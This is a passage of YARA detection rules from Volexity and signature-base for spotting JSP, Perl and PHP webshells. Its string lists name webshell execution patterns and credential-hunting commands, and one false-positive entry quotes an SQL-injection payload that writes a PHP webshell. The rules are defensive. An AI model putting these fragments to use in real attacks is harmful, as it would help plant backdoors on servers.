		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-08-10 Mass exploitation of (Un)authenticated Zimbra RCE CVE-2022-27925/yara.yar#L1-L28"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "52cba9545f662da18ca6e07340d7a9be637b89e7ed702dd58cac545c702a00e3"
		score = 75
		quality = 80
		tags = "WEBSHELLS, COMMODITY"
		hash1 = "2786d2dc738529a34ecde10ffeda69b7f40762bf13e7771451f13a24ab7fc5fe"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 1

	strings:
		$s1 = ".getWriter().write(base64Encode(" wide ascii
		$s2 = ".getAttribute(" ascii wide
		$s3 = "java.security.MessageDigest" ascii wide
		$auth1 = /String xc=\"[a-f0-9]{16}\"/ ascii wide
		$auth2 = "String pass=\"" ascii wide
		$magic = "class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q"
		$magic2 = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class"

	condition:
		all of ($s*) or all of ($auth*) or any of ($magic*)
}
rule VOLEXITY_Webshell_Jsp_General_Runtime_Exec_Req : GENERAL WEBSHELLS {
    meta:
		description = "Looks for a common design pattern in webshells where a request attribute is passed directly to exec()."
		author = "threatintel@volexity.com"
		id = "7f1539bd-a2f0-50dd-b500-ada4e0971d13"
		date = "2022-02-02"
		modified = "2022-08-10"
		reference = "https://github.com/volexity/threat-intel"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-08-10 Mass exploitation of (Un)authenticated Zimbra RCE CVE-2022-27925/yara.yar#L30-L45"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "d3048aba80c1c39f1673931cd2d7c5ed83045603b0ad204073fd788d0103a6c8"
		score = 75
		quality = 80
		tags = "GENERAL, WEBSHELLS"
		hash1 = "4935f0c50057e28efa7376c734a4c66018f8d20157b6584399146b6c79a6de15"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 1

	strings:
		$s1 = "Runtime.getRuntime().exec(request." ascii

	condition:
		$s1
}
rule VOLEXITY_Webshell_Jsp_Regeorg : WEBSHELL COMMODITY {
    meta:
		description = "Detects the reGeorg webshells' JSP version."
		author = "threatintel@volexity.com"
		id = "205ee383-4298-5469-a509-4ce3eaf9dd0e"
		date = "2022-03-08"
		modified = "2022-08-10"
		reference = "https://github.com/SecWiki/WebShell-2/blob/master/reGeorg-master/tunnel.jsp"
		source_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/2022/2022-08-10 Mass exploitation of (Un)authenticated Zimbra RCE CVE-2022-27925/yara.yar#L47-L70"
		license_url = "https://github.com/volexity/threat-intel/blob/ab1416212928e91caf94866c151e05f481bb4c06/LICENSE.txt"
		logic_hash = "cecb71605d9112d509823c26e40e1cf9cd6db581db448db5c9ffc63a2bfe529e"
		score = 75
		quality = 80
		tags = "WEBSHELL, COMMODITY"
		hash1 = "f9b20324f4239a8c82042d8207e35776d6777b6305974964cd9ccc09d431b845"
		license = "See license at https://github.com/volexity/threat-intel/blob/main/LICENSE.txt"
		memory_suitable = 1

	strings:
		$magic = "socketChannel.connect(new InetSocketAddress(target, port))" ascii
		$a1 = ".connect(new InetSocketAddress" ascii
		$a2 = ".configureBlocking(false)" ascii
		$a3 = ".setHeader(" ascii
		$a4 = ".getHeader(" ascii
		$a5 = ".flip();" ascii

	condition:
		$magic or all of ($a*)
}
rule SIGNATURE_BASE_M_Hunting_Webshell_LIGHTWIRE_2 : FILE {
    meta:
		description = "Detects LIGHTWIRE based on the RC4 decoding and execution 1-liner."
		author = "Mandiant (modified by Florian Roth)"
		id = "9451da63-c68e-51e8-b4b1-c3082d46fbf6"
		date = "2024-01-11"
		modified = "2024-01-12"
		reference = "https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_report_ivanti_mandiant_jan24.yar#L60-L81"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3d97f55a03ceb4f71671aa2ecf5b24e9"
		logic_hash = "37b22a6c45dd53bc7b3f0c75cc5072e990246fea24591d192176c0b496e92084"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "eval{my"
		$s2 = "Crypt::RC4->new(\""
		$s3 = "->RC4(decode_base64(CGI::param('"
		$s4 = ";eval $"
		$s5 = "\"Compatibility check: $@\";}"

	condition:
		filesize <10KB and all of them
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Generic : FILE {
    meta:
		description = "php webshell having some kind of input and some kind of payload. restricted to small files or big ones inclusing suspicious strings"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "294ce5d5-55b2-5c79-b0f8-b66f949efbb2"
		date = "2021-01-14"
		modified = "2023-09-18"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L83-L410"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "bee1b76b1455105d4bfe2f45191071cf05e83a309ae9defcf759248ca9bceddd"
		hash = "6bf351900a408120bee3fc6ea39905c6a35fe6efcf35d0a783ee92062e63a854"
		hash = "e3b4e5ec29628791f836e15500f6fdea19beaf3e8d9981c50714656c50d3b365"
		hash = "00813155bf7f5eb441e1619616a5f6b21ae31afc99caa000c4aafd54b46c3597"
		hash = "e31788042d9cdeffcb279533b5a7359b3beb1144f39bacdd3acdef6e9b4aff25"
		hash = "36b91575a08cf40d4782e5aebcec2894144f1e236a102edda2416bc75cbac8dd"
		hash = "a34154af7c0d7157285cfa498734cfb77662edadb1a10892eb7f7e2fb5e2486c"
		hash = "791a882af2cea0aa8b8379791b401bebc235296858266ddb7f881c8923b7ea61"
		hash = "9a8ab3c225076a26309230d7eac7681f85b271d2db22bf5a190adbf66faca2e6"
		hash = "0d3ee83adc9ebf8fb1a8c449eed5547ee5e67e9a416cce25592e80963198ae23"
		hash = "3d8708609562a27634df5094713154d8ca784dbe89738e63951e12184ff07ad6"
		hash = "70d64d987f0d9ab46514abcc868505d95dbf458387f858b0d7580e4ee8573786"
		hash = "259b3828694b4d256764d7d01b0f0f36ca0526d5ee75e134c6a754d2ab0d1caa"
		hash = "04d139b48d59fa2ef24fb9347b74fa317cb05bd8b7389aeb0a4d458c49ea7540"
		hash = "58d0e2ff61301fe0c176b51430850239d3278c7caf56310d202e0cdbdde9ac3f"
		hash = "731f36a08b0e63c63b3a2a457667dfc34aa7ff3a2aee24e60a8d16b83ad44ce2"
		hash = "e4ffd4ec67762fe00bb8bd9fbff78cffefdb96c16fe7551b5505d319a90fa18f"
		hash = "fa00ee25bfb3908808a7c6e8b2423c681d7c52de2deb30cbaea2ee09a635b7d4"
		hash = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
		hash = "e9423ad8e51895db0e8422750c61ef4897b3be4292b36dba67d42de99e714bff"
		hash = "7a16311a371f03b29d5220484e7ecbe841cfaead4e73c17aa6a9c23b5d94544d"
		hash = "7ca5dec0515dd6f401cb5a52c313f41f5437fc43eb62ea4bcc415a14212d09e9"
		hash = "3de8c04bfdb24185a07f198464fcdd56bb643e1d08199a26acee51435ff0a99f"
		hash = "63297f8c1d4e88415bc094bc5546124c9ed8d57aca3a09e36ae18f5f054ad172"
		hash = "a09dcf52da767815f29f66cb7b03f3d8c102da5cf7b69567928961c389eac11f"
		hash = "d9ae762b011216e520ebe4b7abcac615c61318a8195601526cfa11bbc719a8f1"
		hash = "dd5d8a9b4bb406e0b8f868165a1714fe54ffb18e621582210f96f6e5ae850b33"
		logic_hash = "7180250e8a6dd8c14f193fe007b7fd17dc215b470065eb71e7e987699605bc4f"
		score = 75
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$wfp_tiny1 = "escapeshellarg" fullword
		$wfp_tiny2 = "addslashes" fullword
		$gfp_tiny3 = "include \"./common.php\";"
		$gfp_tiny4 = "assert('FALSE');"
		$gfp_tiny5 = "assert(false);"
		$gfp_tiny6 = "assert(FALSE);"
		$gfp_tiny7 = "assert('array_key_exists("
		$gfp_tiny8 = "echo shell_exec($aspellcommand . ' 2>&1');"
		$gfp_tiny9 = "throw new Exception('Could not find authentication source with id ' . $sourceId);"
		$gfp_tiny10 = "return isset( $_POST[ $key ] ) ? $_POST[ $key ] : ( isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $default );"
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$inp1 = "php://input" wide ascii
		$inp2 = /_GET\s?\[/ wide ascii
		$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
		$inp4 = /_POST\s?\[/ wide ascii
		$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
		$inp6 = /_REQUEST\s?\[/ wide ascii
		$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
		$inp8 = /\(\s?\$_HEADERS\s?[\)\[]/ wide ascii
		$inp15 = "_SERVER['HTTP_" wide ascii
		$inp16 = "_SERVER[\"HTTP_" wide ascii
		$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
		$inp18 = "array_values($_SERVER)" wide ascii
		$inp19 = /file_get_contents\("https?:\/\// wide ascii
		$inp20 = "TSOP_" wide ascii
		$cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
		$cpayload10 = /\bpreg_replace[\n\t ]{0,500}\([^\)]{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
		$cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii
		$m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
		$m_cpayload_preg_filter2 = "'|.{0,500}|e'" nocase wide ascii
		$gen_bit_sus1 = /:\s{0,20}eval}/ nocase wide ascii
		$gen_bit_sus2 = /\.replace\(\/\w\/g/ nocase wide ascii
		$gen_bit_sus6 = "self.delete"
		$gen_bit_sus9 = "\"cmd /c" nocase
		$gen_bit_sus10 = "\"cmd\"" nocase
		$gen_bit_sus11 = "\"cmd.exe" nocase
		$gen_bit_sus12 = "%comspec%" wide ascii
		$gen_bit_sus13 = "%COMSPEC%" wide ascii
		$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
		$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
		$gen_bit_sus21 = "\"upload\"" wide ascii
		$gen_bit_sus22 = "\"Upload\"" wide ascii
		$gen_bit_sus23 = "UPLOAD" fullword wide ascii
		$gen_bit_sus24 = "fileupload" wide ascii
		$gen_bit_sus25 = "file_upload" wide ascii
		$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
		$gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
		$gen_bit_sus30 = "serv-u" wide ascii
		$gen_bit_sus31 = "Serv-u" wide ascii
		$gen_bit_sus32 = "Army" fullword wide ascii
		$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
		$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
		$gen_bit_sus35 = "crack" fullword wide ascii
		$gen_bit_sus44 = "<pre>" wide ascii
		$gen_bit_sus45 = "<PRE>" wide ascii
		$gen_bit_sus46 = "shell_" wide ascii
		$gen_bit_sus50 = "bypass" wide ascii
		$gen_bit_sus52 = " ^ $" wide ascii
		$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
		$gen_bit_sus55 = /\w'\.'\w/ wide ascii
		$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
		$gen_bit_sus57 = "dumper" wide ascii
		$gen_bit_sus59 = "'cmd'" wide ascii
		$gen_bit_sus60 = "\"execute\"" wide ascii
		$gen_bit_sus61 = "/bin/sh" wide ascii
		$gen_bit_sus62 = "Cyber" wide ascii
		$gen_bit_sus63 = "portscan" fullword wide ascii
		$gen_bit_sus66 = "whoami" fullword wide ascii
		$gen_bit_sus67 = "$password='" fullword wide ascii
		$gen_bit_sus68 = "$password=\"" fullword wide ascii
		$gen_bit_sus69 = "$cmd" fullword wide ascii
		$gen_bit_sus70 = "\"?>\"." fullword wide ascii
		$gen_bit_sus71 = "Hacking" fullword wide ascii
		$gen_bit_sus72 = "hacking" fullword wide ascii
		$gen_bit_sus73 = ".htpasswd" wide ascii
		$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
		$gen_bit_sus75 = "uploaded" fullword wide ascii
		$gen_much_sus7 = "Web Shell" nocase
		$gen_much_sus8 = "WebShell" nocase
		$gen_much_sus3 = "hidded shell"
		$gen_much_sus4 = "WScript.Shell.1" nocase
		$gen_much_sus5 = "AspExec"
		$gen_much_sus14 = "\\pcAnywhere\\" nocase
		$gen_much_sus15 = "antivirus" nocase
		$gen_much_sus16 = "McAfee" nocase
		$gen_much_sus17 = "nishang"
		$gen_much_sus18 = "\"unsafe" fullword wide ascii
		$gen_much_sus19 = "'unsafe" fullword wide ascii
		$gen_much_sus24 = "exploit" fullword wide ascii
		$gen_much_sus25 = "Exploit" fullword wide ascii
		$gen_much_sus26 = "TVqQAAMAAA" wide ascii
		$gen_much_sus30 = "Hacker" wide ascii
		$gen_much_sus31 = "HACKED" fullword wide ascii
		$gen_much_sus32 = "hacked" fullword wide ascii
		$gen_much_sus33 = "hacker" wide ascii
		$gen_much_sus34 = "grayhat" nocase wide ascii
		$gen_much_sus35 = "Microsoft FrontPage" wide ascii
		$gen_much_sus36 = "Rootkit" wide ascii
		$gen_much_sus37 = "rootkit" wide ascii
		$gen_much_sus38 = "/*-/*-*/" wide ascii
		$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
		$gen_much_sus40 = "\"e\"+\"v" wide ascii
		$gen_much_sus41 = "a\"+\"l\"" wide ascii
		$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
		$gen_much_sus43 = "q\"+\"u\"" wide ascii
		$gen_much_sus44 = "\"u\"+\"e" wide ascii
		$gen_much_sus45 = "/*//*/" wide ascii
		$gen_much_sus46 = "(\"/*/\"" wide ascii
		$gen_much_sus47 = "eval(eval(" wide ascii
		$gen_much_sus48 = "unlink(__FILE__)" wide ascii
		$gen_much_sus49 = "Shell.Users" wide ascii
		$gen_much_sus50 = "PasswordType=Regular" wide ascii
		$gen_much_sus51 = "-Expire=0" wide ascii
		$gen_much_sus60 = "_=$$_" wide ascii
		$gen_much_sus61 = "_=$$_" wide ascii
		$gen_much_sus62 = "++;$" wide ascii
		$gen_much_sus63 = "++; $" wide ascii
		$gen_much_sus64 = "_.=$_" wide ascii
		$gen_much_sus70 = "-perm -04000" wide ascii
		$gen_much_sus71 = "-perm -02000" wide ascii
		$gen_much_sus72 = "grep -li password" wide ascii
		$gen_much_sus73 = "-name config.inc.php" wide ascii
		$gen_much_sus75 = "password crack" wide ascii
		$gen_much_sus76 = "mysqlDll.dll" wide ascii
		$gen_much_sus77 = "net user" wide ascii
		$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
		$gen_much_sus81 = /strrev\(['"]/ wide ascii
		$gen_much_sus82 = "PHPShell" fullword wide ascii
		$gen_much_sus821 = "PHP Shell" fullword wide ascii
		$gen_much_sus83 = "phpshell" fullword wide ascii
		$gen_much_sus84 = "PHPshell" fullword wide ascii
		$gen_much_sus87 = "deface" wide ascii
		$gen_much_sus88 = "Deface" wide ascii
		$gen_much_sus89 = "backdoor" wide ascii
		$gen_much_sus90 = "r00t" fullword wide ascii
		$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
		$gen_much_sus92 = "str_rot13" fullword wide ascii
		$gif = { 47 49 46 38 }
		$cmpayload1 = /\beval[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload2 = /\bexec[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload3 = /\bshell_exec[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload4 = /\bpassthru[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload5 = /\bsystem[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload6 = /\bpopen[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload7 = /\bproc_open[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload8 = /\bpcntl_exec[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload9 = /\bassert[\t ]{0,500}\([^)0]/ nocase wide ascii
		$cmpayload10 = /\bpreg_replace[\t ]{0,500}\([^\)]{1,100}\/e/ nocase wide ascii
		$cmpayload11 = /\bpreg_filter[\t ]{0,500}\([^\)]{1,100}\/e/ nocase wide ascii
		$cmpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cmpayload20 = /\bcreate_function[\t ]{0,500}\([^)]/ nocase wide ascii
		$cmpayload21 = /\bReflectionFunction[\t ]{0,500}\([^)]/ nocase wide ascii
		$fp1 = "# Some examples from obfuscated malware:" ascii
		$fp2 = "{@see TFileUpload} for further details." ascii

	condition:
		not ( any of ($gfp_tiny*) or 1 of ($fp*)) and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and ( any of ($inp*)) and ( any of ($cpayload*) or all of ($m_cpayload_preg_filter*)) and (( filesize <1000 and not any of ($wfp_tiny*)) or (($gif at 0 or ( filesize <4KB and (1 of ($gen_much_sus*) or 2 of ($gen_bit_sus*))) or ( filesize <20KB and (2 of ($gen_much_sus*) or 3 of ($gen_bit_sus*))) or ( filesize <50KB and (2 of ($gen_much_sus*) or 4 of ($gen_bit_sus*))) or ( filesize <100KB and (2 of ($gen_much_sus*) or 6 of ($gen_bit_sus*))) or ( filesize <150KB and (3 of ($gen_much_sus*) or 7 of ($gen_bit_sus*))) or ( filesize <500KB and (4 of ($gen_much_sus*) or 8 of ($gen_bit_sus*)))) and ( filesize >5KB or not any of ($wfp_tiny*))) or ( filesize <500KB and (4 of ($cmpayload*))))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Generic_Callback : FILE {
    meta:
		description = "php webshell having some kind of input and using a callback to execute the payload. restricted to small files or would give lots of false positives"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "e33dba84-bbeb-5955-a81b-2d2c8637fb48"
		date = "2021-01-14"
		modified = "2023-09-18"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L412-L717"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e98889690101b59260e871c49263314526f2093f"
		hash = "63297f8c1d4e88415bc094bc5546124c9ed8d57aca3a09e36ae18f5f054ad172"
		hash = "81388c8cc99353cdb42572bb88df7d3bd70eefc748c2fa4224b6074aa8d7e6a2"
		hash = "27d3bfabc283d851b0785199da8b1b0384afcb996fa9217687274dd56a7b5f49"
		hash = "ee256d7cc3ceb2bf3a1934d553cdd36e3fbde62a02b20a1b748a74e85d4dbd33"
		hash = "4adc6c5373c4db7b8ed1e7e6df10a3b2ce5e128818bb4162d502056677c6f54a"
		hash = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
		hash = "2967f38c26b131f00276bcc21227e54ee6a71881da1d27ec5157d83c4c9d4f51"
		hash = "1ba02fb573a06d5274e30b2b05573305294497769414e964a097acb5c352fb92"
		hash = "f4fe8e3b2c39090ca971a8e61194fdb83d76fadbbace4c5eb15e333df61ce2a4"
		hash = "badda1053e169fea055f5edceae962e500842ad15a5d31968a0a89cf28d89e91"
		hash = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
		hash = "51c2c8b94c4b8cce806735bcf6e5aa3f168f0f7addce47b699b9a4e31dc71b47"
		hash = "de1ef827bcd3100a259f29730cb06f7878220a7c02cee0ebfc9090753d2237a8"
		hash = "487e8c08e85774dfd1f5e744050c08eb7d01c6877f7d03d7963187748339e8c4"
		logic_hash = "e12dec5252a816c10443fe0e0b40b0b9b4a187b32facd8e09e1f057801da25f9"
		score = 60
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$gfp1 = "eval(\"return [$serialised_parameter"
		$gfp2 = "$this->assert(strpos($styles, $"
		$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
		$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
		$gfp5 = "$_POST[partition_by]($_POST["
		$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
		$gfp7 = "The above example code can be easily exploited by passing in a string such as"
		$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
		$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
		$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
		$gfp11 = "(eval (getenv \"EPROLOG\")))"
		$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
		$gfp_tiny3 = "include \"./common.php\";"
		$gfp_tiny4 = "assert('FALSE');"
		$gfp_tiny5 = "assert(false);"
		$gfp_tiny6 = "assert(FALSE);"
		$gfp_tiny7 = "assert('array_key_exists("
		$gfp_tiny8 = "echo shell_exec($aspellcommand . ' 2>&1');"
		$gfp_tiny9 = "throw new Exception('Could not find authentication source with id ' . $sourceId);"
		$gfp_tiny10 = "return isset( $_POST[ $key ] ) ? $_POST[ $key ] : ( isset( $_REQUEST[ $key ] ) ? $_REQUEST[ $key ] : $default );"
		$inp1 = "php://input" wide ascii
		$inp2 = /_GET\s?\[/ wide ascii
		$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
		$inp4 = /_POST\s?\[/ wide ascii
		$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
		$inp6 = /_REQUEST\s?\[/ wide ascii
		$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
		$inp15 = "_SERVER['HTTP_" wide ascii
		$inp16 = "_SERVER[\"HTTP_" wide ascii
		$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
		$inp18 = "array_values($_SERVER)" wide ascii
		$inp19 = /file_get_contents\("https?:\/\// wide ascii
		$callback1 = /\bob_start[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback2 = /\barray_diff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback3 = /\barray_diff_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback4 = /\barray_filter[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback5 = /\barray_intersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback6 = /\barray_intersect_ukey[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback7 = /\barray_map[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback8 = /\barray_reduce[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback9 = /\barray_udiff_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback10 = /\barray_udiff_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback11 = /\barray_udiff[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback12 = /\barray_uintersect_assoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback13 = /\barray_uintersect_uassoc[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback14 = /\barray_uintersect[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback15 = /\barray_walk_recursive[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback16 = /\barray_walk[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback17 = /\bassert_options[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback18 = /\buasort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback19 = /\buksort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback20 = /\busort[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback21 = /\bpreg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback22 = /\bspl_autoload_register[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback23 = /\biterator_apply[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback24 = /\bcall_user_func[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback25 = /\bcall_user_func_array[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback26 = /\bregister_shutdown_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback27 = /\bregister_tick_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback28 = /\bset_error_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback29 = /\bset_exception_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback30 = /\bsession_set_save_handler[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback31 = /\bsqlite_create_aggregate[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback32 = /\bsqlite_create_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$callback33 = /\bmb_ereg_replace_callback[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$m_callback1 = /\bfilter_var[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$m_callback2 = "FILTER_CALLBACK" fullword wide ascii
		$cfp1 = /ob_start\(['\"]ob_gzhandler/ nocase wide ascii
		$cfp2 = "IWPML_Backend_Action_Loader" ascii wide
		$cfp3 = "<?phpclass WPML" ascii
		$gen_bit_sus1 = /:\s{0,20}eval}/ nocase wide ascii
		$gen_bit_sus2 = /\.replace\(\/\w\/g/ nocase wide ascii
		$gen_bit_sus6 = "self.delete"
		$gen_bit_sus9 = "\"cmd /c" nocase
		$gen_bit_sus10 = "\"cmd\"" nocase
		$gen_bit_sus11 = "\"cmd.exe" nocase
		$gen_bit_sus12 = "%comspec%" wide ascii
		$gen_bit_sus13 = "%COMSPEC%" wide ascii
		$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
		$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
		$gen_bit_sus21 = "\"upload\"" wide ascii
		$gen_bit_sus22 = "\"Upload\"" wide ascii
		$gen_bit_sus23 = "UPLOAD" fullword wide ascii
		$gen_bit_sus24 = "fileupload" wide ascii
		$gen_bit_sus25 = "file_upload" wide ascii
		$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
		$gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
		$gen_bit_sus30 = "serv-u" wide ascii
